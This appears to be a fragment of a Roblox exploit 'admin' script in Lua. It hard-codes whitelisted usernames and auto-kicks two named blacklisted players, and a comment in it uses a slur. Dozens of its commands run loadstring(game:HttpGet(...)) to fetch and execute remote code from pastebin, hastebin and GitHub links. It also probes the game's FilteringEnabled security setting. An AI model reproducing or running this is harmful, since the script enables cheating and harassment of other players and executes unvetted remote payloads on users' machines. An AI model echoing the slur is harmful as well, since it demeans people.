...
WL ={'Hmm465','Kir0ki','010101xText','cajuntiger','ParanoidActions','Helkern','Epticallity','Average_Logic','thedoctoratimelord1',LP.Name}
BlackList = {'InnovatingCreativity','camocolor'} --dont remove these people or your gay
function kickF(plr)
spawn(function()
...
spawn(function()
repeat wait() until player.Character
Notify('Perm Banned player, ' .. player.Name .. ' attempted to join')
kickF(player)
end)
end
if FindTable(BlackList, player.Name) then
spawn(function()
repeat wait() until player.Character
Notify('BlackListed player, ' .. player.Name .. ' attempted to join')
kickF(player)
end)
end
...
Notify("shutting down... (this might take awhile)")
...
model.Parent = workspace
hum.Parent = model
head.Position = Vector3.new(math.random(999000, 1001000), 10000, 0)
hrp.Position = head.Position
plr.Character = model
local Plat = Instance.new('SkateboardPlatform', plr.Character) Plat.Position = head.Position
Plat.Name = 'Dead'
Plat.Size = Vector3.new(100, 1, 100)
local PART = Instance.new('Part', plr.Character)
PART.Position = Plat.Position - Vector3.new(0, 2, 0)
...
addcmd('johndoe','johndoe',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/mSBRwJN5'),true))()
end
end)

addcmd('inkmonster','inkmonster',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/2D8BA0MD'),true))()
end
end)

addcmd('grabknife','grabknife',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/cT87dNZx'),true))()
end
end)


addcmd('thecreator','thecreator',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/BfHBhYJm'),true))()
end
end)

addcmd('thecreator2', 'thecreator2',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/a7tjELfL'),true))()
end
end)

addcmd('angrymode','angrymode',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/neT8gJPz'),true))()
end
end)


addcmd('murder','murder',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/s0R4SHVK'),true))()
end
end)
...
loadstring(game:HttpGet(('https://hastebin.com/raw/difewuvazo.lua'),true))()
end
end)

addcmd('chara2', 'chara2',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/iXkcc0r6'),true))()
end
end)

addcmd('chara3', 'chara3',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/MxFaMGea'),true))()
end
end)
...
loadstring(game:HttpGet(('https://pastebin.com/raw/grAZsp7p'),true))()
end
end)

addcmd('darngod', 'darngod',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/GD6Ry5Vt'),true))()
end
end)
...
loadstring(game:HttpGet(('https://pastebin.com/raw/HP3ufNJP'),true))()
end
end)
...
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Hmm465GamingYT/sin/master/sin.lua'),true))()
end
end)


addcmd('defaultlighting', 'resets lighting to the default settings in studio',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
loadstring(game:HttpGet(('https://pastebin.com/raw/rJMhbuqs'),true))()
end
end)
---------------------------------------------------------------------------------------------------------------
...
local function NS()
loadstring(game:HttpGet(('https://pastebin.com/raw/wcEw3rW9'),true))()
if workspace.FilteringEnabled == true then Notify('Filtering ENABLED '..ServerMessage) 
elseif workspace.FilteringEnabled == false then Notify('Filtering Disabled '..ServerMessage) end
end
local getPastebin = pcall(NS)
if not getPastebin then
if workspace.FilteringEnabled == true then Notify('Filtering ENABLED') 
elseif workspace.FilteringEnabled == false then Notify('Filtering Disabled') end
end
...
if FindTable(pbans, player.userId) then 
Notify(" "..player.Name.." has been auto kicked for being in your pbans")
kickF(player)
end
end
...
for _, player in pairs(game.Players:GetPlayers()) do
if FindTable(BlackList, player.Name) then 
Notify(" "..player.Name.." has been auto kicked for being in blacklist")
kickF(player)
end
end
